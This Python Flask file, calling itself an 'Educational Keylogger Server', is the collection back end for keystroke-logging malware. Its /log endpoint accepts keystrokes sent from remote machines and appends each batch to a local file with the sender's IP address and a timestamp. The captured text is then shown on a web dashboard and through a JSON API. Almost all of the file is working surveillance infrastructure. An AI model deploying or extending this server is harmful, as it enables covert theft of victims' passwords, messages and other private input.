from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# LOG_FILE = 'keyboard_capture.txt' # File to store the logged text (locally)
LOG_FILE = os.path.join(os.path.dirname(__file__), 'keyboard_capture.txt')

"""Get client IP address, handling proxies"""
def get_client_ip():
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        return request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0] # Behind proxy - get the real IP
    else:
        return request.environ.get('REMOTE_ADDR') # Direct connection

"""Display captured data via web interface"""
@app.route('/')
def home():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
            return f"""
            <html>
                <head><title>Educational Keylogger Server</title></head>
                <body>
                    <h1>Educational Keylogger - Captured Text</h1>
                    <div style="border: 1px solid #ccc; padding: 20px; background: #f9f9f9; white-space: pre-wrap; font-family: monospace;">
                        {content if content else 'No text captured yet.'}
                    </div>
                    <p><small>Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</small></p>
                </body>
            </html>
            """
        else:
            return "<h1>Educational Keylogger Server</h1><p>No data captured yet.</p>"
    except Exception as e:
        return f"<h1>Error</h1><p>{str(e)}</p>"

"""Receive and store keyboard data"""
@app.route('/log', methods=['POST'])
def receive_keys():
    try:
        data = request.json
        keyboard_data = data.get('keyboard_data', '')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        client_ip = get_client_ip()

        if keyboard_data:
            print(f"Received from {client_ip}: {keyboard_data[:50]}...") # Log to console

            # Save to file (append mode)
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"\n--- IP: {client_ip} | Time: {timestamp} ---\n")
                f.write(keyboard_data)
                f.write(f"\n{'='*50}\n")

            return jsonify({
                "status": "success",
                "message": f"Received {len(keyboard_data)} characters",
                "received_at": datetime.now().isoformat(),
            })
        else:
            return jsonify({"status": "ignored", "message": "Empty data"})

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

"""API endpoint to get logs as JSON"""
@app.route('/api/logs')
def api_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
            return jsonify({
                "status": "success",
                "data": content,
                "file_size": len(content)
            })
        else:
            return jsonify({"status": "success", "data": "", "message": "No logs yet"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

""" For local testing
if __name__ == '__main__':
    print("Starting Simple Educational Keylogger Server...")
    print("Access the dashboard at: http://127.0.0.1:5000")
    print("View raw data at: http://127.0.0.1:5000/api/logs")
    app.run(debug=True)
"""